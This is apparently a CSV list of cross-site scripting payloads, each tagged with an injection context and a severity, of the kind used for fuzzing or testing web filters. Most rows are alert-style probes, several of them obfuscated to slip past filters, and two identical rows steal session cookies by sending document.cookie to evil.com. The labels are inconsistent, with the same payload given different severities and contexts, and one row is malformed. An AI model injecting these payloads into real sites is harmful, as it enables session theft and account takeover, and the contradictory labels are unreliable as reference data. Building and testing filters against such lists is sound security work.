payload,context,severity
&quot; onerror=alert(1) x=&quot;,js_uri,medium
<BODY ONLOAD=alert(’XSS’)>,html_body,medium
javascript:confirm(1),attribute,medium
{{7*7}},script_injection,low
javascript:alert(document.domain),js_uri,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",js_uri,high
<img src=x onerror=al'+'ert(1)>,event_handler,high
""" onfocus=alert(1) autofocus=""",attribute,medium
"<iframe src=""javascript:confirm(1)"">",template_injection,medium
""" onload=alert(1) x=""",script_injection,low
"<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
<%= alert(1) %>,template_injection,medium
javascript:confirm(1),template_injection,medium
#{\u0061\u006cert(1)},template_injection,medium
""" onfocus=alert(1) autofocus=""",attribute,high
""" onfocus=alert(1) autofocus=""",attribute,low
&quot; onload=alert(1) x=&quot;,attribute_escape,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
<img src=x onerror=alert(1)>,tag_injection,high
javascript:alert(document.domain),event_handler,low
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",script_injection,low
"dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt>",js_uri,low
javascript:confirm(1),js_uri,high
' onmouseover=alert(1) ',attribute,medium
"<img src
=x onerror
=alert(	1)>",event_handler,low
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
<svg onload=alert(1)>,event_handler,low
"document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>""",dom_sink,medium
<SvG OnLoAd=aLeRt(1)>,event_handler,high
"eval(""alert(1)"")",attribute_escape,high
onerror='alert(1)',html_body,medium
<select>d.innerHTML+='';</script>,html_body,high
"location=""javascript:alert(1)""",dom_sink,low
<ImG SrC=X OnErRoR=AlErT(1)>,tag_injection,high
${alert(1)},template_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<svg onload=alert()>,html_body,medium
${alert(1)},template_injection,medium
<svg/onload=alert(1)>,tag_injection,medium
javascript:confirm(1),attribute,low
' \x3e\x3cimg src=x onerror=alert(1)\x3e,js_uri,high
